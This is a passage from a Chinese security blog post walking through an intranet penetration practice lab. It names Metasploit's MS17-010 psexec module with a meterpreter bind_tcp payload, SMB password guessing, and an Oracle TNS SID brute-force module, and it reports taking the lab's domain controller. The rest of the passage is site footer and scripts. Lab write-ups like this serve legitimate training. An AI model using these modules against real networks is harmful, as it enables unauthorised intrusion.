+<pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/ms17_010_psexec
+<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp</code></pre>
+
+<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123133538.png" alt="image-20211123133537387" loading="lazy"></p>
+<p>但是这个攻击成功了，有点不理解了【计算机玄学】——到这里拿下了域控服务器。但是win2003还没拿到权限。</p>
+<h3 id="SMB远程桌面口令猜测"><a href="#SMB远程桌面口令猜测" class="headerlink" title="SMB远程桌面口令猜测"></a>SMB远程桌面口令猜测</h3><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123152731.png" alt="image-20211123152729981" loading="lazy"></p>
+<p>发现好像是2003的这台机器出问题了啊。因为漏洞在这台机器上的都不能成功利用。反而在2008机器上可以利用。</p>
+<h3 id="Oracle数据库TNS服务漏洞"><a href="#Oracle数据库TNS服务漏洞" class="headerlink" title="Oracle数据库TNS服务漏洞"></a>Oracle数据库TNS服务漏洞</h3><p>调用模块<code>use auxiliary/admin/oracle/sid_brute</code></p>
+<h2 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…."></a>未完待续….</h2><p>内网横向待学习……</p>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://m0re.top/posts/564d8432/" title="【内网安全】红日安全靶场（上）">https://m0re.top/posts/564d8432/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/873290a1/" rel="next" title="【应急响应篇】——Windows系统排查"><span class="post-nav-text">【应急响应篇】——Windows系统排查</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
+  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
+  valineConfig.path = "/posts/564d8432/"
+  new Valine(valineConfig)
+}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2020025591号-1</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2020-02-21T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
